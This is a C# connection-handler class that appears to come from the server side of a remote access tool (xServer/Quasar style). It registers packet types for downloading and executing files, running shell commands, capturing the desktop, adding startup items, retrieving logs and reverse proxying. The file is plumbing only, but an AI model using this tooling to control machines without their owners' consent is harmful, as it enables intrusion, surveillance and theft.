﻿using System;
using System.Collections.Generic;
using xServer.Core.Packets;

namespace xServer.Core.Networking
{
    public class ConnectionHandler
    {
        /// <summary>
        /// The Server which this class is handling.
        /// </summary>
        private Server ListenServer { get; set; }

        /// <summary>
        /// A hashset containing all unique client IDs that have ever connected to the server.
        /// </summary>
        private HashSet<string> AllTimeConnectedClients { get; set; }

        /// <summary>
        /// The number of all unique clients which have ever connected to the server.
        /// </summary>
        public int AllTimeConnectedClientsCount { get { return AllTimeConnectedClients.Count; } }

        /// <summary>
        /// The amount of currently connected and authenticated clients.
        /// </summary>
        public int ConnectedAndAuthenticatedClients { get; set; }

        /// <summary>
        /// The listening state of the server. True if listening, else False.
        /// </summary>
        public bool Listening { get { return ListenServer.Listening; } }

        /// <summary>
        /// The total amount of received bytes.
        /// </summary>
        public long BytesReceived { get { return ListenServer.BytesReceived; } }

        /// <summary>
        /// The total amount of sent bytes.
        /// </summary>  
        public long BytesSent { get { return ListenServer.BytesSent; } }

        /// <summary>
        /// Occurs when the state of the server changes.
        /// </summary>
        public event ServerStateEventHandler ServerState;

        /// <summary>
        /// Represents a method that will handle a change in the server's state.
        /// </summary>
        /// <param name="listening">The new listening state of the server.</param>
        public delegate void ServerStateEventHandler(ushort port, bool listening);

        /// <summary>
        /// Fires an event that informs subscribers that the server has changed it's state.
        /// </summary>
        /// <param name="server">The server which changed it's state.</param>
        /// <param name="listening">The new listening state of the server.</param>
        private void OnServerState(Server server, bool listening)
        {
            if (ServerState != null)
            {
                ServerState(server.Port, listening);
            }
        }

        /// <summary>
        /// Occurs when a client connected.
        /// </summary>
        public event ClientConnectedEventHandler ClientConnected;

        /// <summary>
        /// Represents the method that will handle the connected client.
        /// </summary>
        /// <param name="client">The connected client.</param>
        public delegate void ClientConnectedEventHandler(Client client);

        /// <summary>
        /// Fires an event that informs subscribers that the client is connected.
        /// </summary>
        /// <param name="client">The connected client.</param>
        private void OnClientConnected(Client client)
        {
            if (ClientConnected != null)
            {
                ClientConnected(client);
            }
        }

        /// <summary>
        /// Occurs when a client disconnected.
        /// </summary>
        public event ClientDisconnectedEventHandler ClientDisconnected;

        /// <summary>
        /// Represents the method that will handle the disconnected client.
        /// </summary>
        /// <param name="client">The disconnected client.</param>
        public delegate void ClientDisconnectedEventHandler(Client client);

        /// <summary>
        /// Fires an event that informs subscribers that the client is disconnected.
        /// </summary>
        /// <param name="client">The disconnected client.</param>
        private void OnClientDisconnected(Client client)
        {
            if (ClientDisconnected != null)
            {
                ClientDisconnected(client);
            }
        }

        /// <summary>
        /// Constructor, initializes required objects and subscribes to events of the server.
        /// </summary>
        public ConnectionHandler()
        {
            AllTimeConnectedClients = new HashSet<string>();

            ListenServer = new Server();

            ListenServer.AddTypesToSerializer(typeof(IPacket), new Type[]
            {
                typeof (Packets.ServerPackets.InitializeCommand),
                typeof (Packets.ServerPackets.Disconnect),
                typeof (Packets.ServerPackets.Reconnect),
                typeof (Packets.ServerPackets.Uninstall),
                typeof (Packets.ServerPackets.DownloadAndExecute),
                typeof (Packets.ServerPackets.UploadAndExecute),
                typeof (Packets.ServerPackets.Desktop),
                typeof (Packets.ServerPackets.GetProcesses),
                typeof (Packets.ServerPackets.KillProcess),
                typeof (Packets.ServerPackets.StartProcess),
                typeof (Packets.ServerPackets.Drives),
                typeof (Packets.ServerPackets.Directory),
                typeof (Packets.ServerPackets.DownloadFile),
                typeof (Packets.ServerPackets.MouseClick),
                typeof (Packets.ServerPackets.GetSystemInfo),
                typeof (Packets.ServerPackets.VisitWebsite),
                typeof (Packets.ServerPackets.ShowMessageBox),
                typeof (Packets.ServerPackets.Update),
                typeof (Packets.ServerPackets.Monitors),
                typeof (Packets.ServerPackets.ShellCommand),
                typeof (Packets.ServerPackets.Rename),
                typeof (Packets.ServerPackets.Delete),
                typeof (Packets.ServerPackets.Action),
                typeof (Packets.ServerPackets.GetStartupItems),
                typeof (Packets.ServerPackets.AddStartupItem),
                typeof (Packets.ServerPackets.RemoveStartupItem),
                typeof (Packets.ServerPackets.DownloadFileCanceled),
                typeof (Packets.ServerPackets.GetLogs),
                typeof (Packets.ClientPackets.Initialize),
                typeof (Packets.ClientPackets.Status),
                typeof (Packets.ClientPackets.UserStatus),
                typeof (Packets.ClientPackets.DesktopResponse),
                typeof (Packets.ClientPackets.GetProcessesResponse),
                typeof (Packets.ClientPackets.DrivesResponse),
                typeof (Packets.ClientPackets.DirectoryResponse),
                typeof (Packets.ClientPackets.DownloadFileResponse),
                typeof (Packets.ClientPackets.GetSystemInfoResponse),
                typeof (Packets.ClientPackets.MonitorsResponse),
                typeof (Packets.ClientPackets.ShellCommandResponse),
                typeof (Packets.ClientPackets.GetStartupItemsResponse),
                typeof (Packets.ClientPackets.GetLogsResponse),
                typeof (ReverseProxy.Packets.ReverseProxyConnect),
                typeof (ReverseProxy.Packets.ReverseProxyConnectResponse),
                typeof (ReverseProxy.Packets.ReverseProxyData),
                typeof (ReverseProxy.Packets.ReverseProxyDisconnect)
            });

            ListenServer.ServerState += OnServerState;
            ListenServer.ClientState += ClientState;
            ListenServer.ClientRead += ClientRead;
        }

        /// <summary>
        /// Counts the unique client ID to all time connected clients.
        /// </summary>
        /// <remarks>
        /// If the client already connected before, the client ID won't be added.
        /// </remarks>
        /// <param name="id">The ID to add.</param>
        public void CountAllTimeConnectedClientById(string id)
        {
            AllTimeConnectedClients.Add(id);
        }

        /// <summary>
        /// Begins listening for clients.
        /// </summary>
        /// <param name="port">Port to listen for clients on.</param>
        public void Listen(ushort port)
        {
            if (!ListenServer.Listening) ListenServer.Listen(port);
        }

        /// <summary>
        /// Disconnect the server from all of the clients and discontinue
        /// listening (placing the server in an "off" state).
        /// </summary>
        public void Disconnect()
        {
            if (ListenServer.Listening) ListenServer.Disconnect();
        }

        /// <summary>
        /// Decides if the client connected or disconnected.
        /// </summary>
        /// <param name="server">The server the client is connected to.</param>
        /// <param name="client">The client which changed its state.</param>
        /// <param name="connected">True if the client connected, false if disconnected.</param>
        private void ClientState(Server server, Client client, bool connected)
        {
            switch (connected)
            {
                case true:
                    OnClientConnected(client);
                    break;
                case false:
                    OnClientDisconnected(client);
                    break;
            }
        }

        /// <summary>
        /// Forwards received packets from the client to the PacketHandler.
        /// </summary>
        /// <param name="server">The server the client is connected to.</param>
        /// <param name="client">The client which has received the packet.</param>
        /// <param name="packet">The received packet.</param>
        private void ClientRead(Server server, Client client, IPacket packet)
        {
            PacketHandler.HandlePacket(client, packet);
        }
    }
}